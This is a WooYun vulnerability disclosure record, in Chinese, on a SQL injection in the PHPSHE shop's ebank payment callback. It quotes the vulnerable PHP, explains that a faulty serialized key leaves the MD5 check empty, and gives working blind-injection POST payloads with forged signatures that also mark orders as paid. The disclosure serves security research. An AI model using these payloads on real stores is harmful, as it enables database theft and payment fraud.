{"id": 34862, "wybug_id": "wooyun-2015-0105301", "wybug_title": "PHPSHE SQL注入", "wybug_corp": "phpshe.com", "wybug_author": "xiaoL", "wybug_date": "2015-04-03 16:57", "wybug_open_date": "2015-07-12 22:54", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-13：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-12：\t细节向公众公开  简要描述： 又SQL注入了。 详细说明：   WooYun: PHPSHE SQL注入 来看看这个去年的漏洞修复的怎么样了- -\n<?phpinclude('../../../../common.php');$cache_payway = cache::get('payway'); $payway = unserialize($cache_payway['ebank']['payway_config']);$key   = $payway['ebank_md5'];  //？？？？？？？？？？这个位置呢？$v_oid     =trim($_POST['v_oid']);      $v_pmode   =trim($_POST['v_pmode']);      $v_pstatus =trim($_POST['v_pstatus']);      $v_pstring =trim($_POST['v_pstring']);      $v_amount  =trim($_POST['v_amount']);     $v_moneytype  =trim($_POST['v_moneytype']);     $remark1   =trim($_POST['remark1']);     $remark2   =trim($_POST['remark2']);     $v_md5str  =trim($_POST['v_md5str']); /** * 重新计算md5的值 */                           $md5string=strtoupper(md5($v_oid.$v_pstatus.$v_amount.$v_moneytype.$key));/** * 判断返回信息，如果支付成功，并且支付结果可信，则做进一步的处理 */if ($v_md5str==$md5string) {\tif($v_pstatus==\"20\") {\t\t$info = $db->pe_select('order', array('order_id'=>$v_oid));\t\tif ($info['order_state'] == 'notpay') {\t\t\t$order['order_outid'] = $v_pmode;\t\t\t$order['order_payway'] = 'ebank';\t\t\t$order['order_state'] = 'paid';\t\t\t$order['order_ptime'] = time();\t\t\t\t\t\t\t\t$db->pe_update('order', array('order_id'=>$v_oid), $order);\t\t\tpe_success('订单支付成功...');\t\t}\t}\telse {\t\techo \"支付失败\";\t}}else{\techo \"<br>校验失败,数据可疑\";\t\t\t//多了这么一句- -   不知道其他地方修复的怎么样}?></BODY></HTML>\n可以看到官网也更新了\n\n接下来检查$payway['ebank_md5']; 这个值在哪里。后台的话是在http://localhost/admin.php?mod=payway&act=edit&id=1\n\n然后这个值是写在\\data\\cache\\payway.cache.php里面的。\n\n本来以为修复好了，但是！这个serialize明显错了，所以unserialize根本就解不出正确的ebank_md5的值，因此这里$key还是空的，导致了再次的注入。   漏洞证明：  所以注入方式还是那样的。真：localhost/include/plugin/payway/ebank/Receive.phpPOST：v_oid=1504010001' and substring(user(),1,1)=char(114)-- 1&v_pstatus=20&v_amount=1&v_moneytype=1&v_md5str=142B4BECC6EBEDDF345ED1EDAA4CD1A1就会更新数据库。\n\n假：localhost/include/plugin/payway/ebank/Receive.phpPOST:v_oid=1504010001' and substring(user(),1,1)=char(11)-- 1&v_pstatus=20&v_amount=1&v_moneytype=1&v_md5str=E525D914466B228CD57DEDB0D90F8674就只执行一条语句。\n\n   修复方案：  好好处理unserialize()里面的数据。   版权声明：转载请注明来源 xiaoL@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-07-12 22:54 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}